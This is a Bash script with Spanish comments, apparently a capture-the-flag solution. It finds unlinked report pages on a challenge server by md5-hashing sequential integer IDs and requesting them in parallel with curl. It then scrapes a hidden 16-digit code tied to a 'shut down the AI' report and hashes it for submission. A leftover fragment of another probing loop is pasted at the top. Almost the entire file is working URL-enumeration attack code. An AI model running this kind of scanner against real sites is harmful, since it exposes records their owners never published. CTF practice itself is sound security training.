  [ -z "$cand" ] && continue
  h=$(printf "%s" "$cand" | md5sum | cut -d' ' -f1)
  code=$(curl -s -L -o /dev/null -w "%{http_code}" "$BASE/$h/")
  echo "$cand -> $code"
done < numeros.txt | grep -v 404






#!/usr/bin/env bash
# probe_ids.sh - la regla es:  /codes/ md5(<id entero>) /
# Confirmada con: md5("9912")=archivo A, md5("9995")=archivo B.
# Busca reportes NO linkeados; el de "apagar la IA" tiene un codigo de 16 digitos.
#
# Uso:
#   bash probe_ids.sh            # rango 9900..10050 (zona caliente, rapido)
#   bash probe_ids.sh 0 99999    # barrido amplio
#
# OJO: md5 del id SIN salto de linea -> printf '%s' (nunca 'echo', que mete \n).
set -u
BASE="https://chl-61f36451-dce1-47e2-8c43-7a8abcfe83f4-apagar-ia.softwareseguro.com.ar/codes"
START=${1:-9900}
END=${2:-10050}

# --- sanity: el id 9912 (archivo A) DEBE existir. Si no, arreglá red/BASE. ---
h=$(printf '%s' 9912 | md5sum | cut -d' ' -f1)
sc=$(curl -s -o /dev/null -w '%{http_code}' -L "$BASE/$h/")
echo "[sanity] id=9912 -> HTTP $sc (esperado 200)   hash=$h"
if [ "$sc" != "200" ]; then
  echo "  !! El sanity no dio 200. No confies en el loop hasta arreglarlo."
fi
echo "[*] barriendo ids $START..$END"

probe() {
  local i="$1" base="$2"
  local h; h=$(printf '%s' "$i" | md5sum | cut -d' ' -f1)
  local tmp; tmp=$(mktemp)
  local code; code=$(curl -s -o "$tmp" -w '%{http_code}' -L "$base/$h/")
  if [ "$code" != "404" ]; then
    # extrae un posible codigo de 16 digitos del HTML
    local hit; hit=$(grep -oE '[0-9]{16}' "$tmp" | head -1)
    if [ -n "$hit" ]; then
      echo ">>> id=$i HTTP $code  *** CODIGO16=$hit ***  $base/$h/"
      echo "    md5($hit) = $(printf '%s' "$hit" | md5sum | cut -d' ' -f1)   <- esto al juez"
    else
      echo ">>> id=$i HTTP $code  (reporte, sin codigo 16)  $base/$h/"
    fi
  fi
  rm -f "$tmp"
}
export -f probe

seq "$START" "$END" | xargs -P 20 -I{} bash -c 'probe "$@"' _ {} "$BASE"
echo "[fin]"
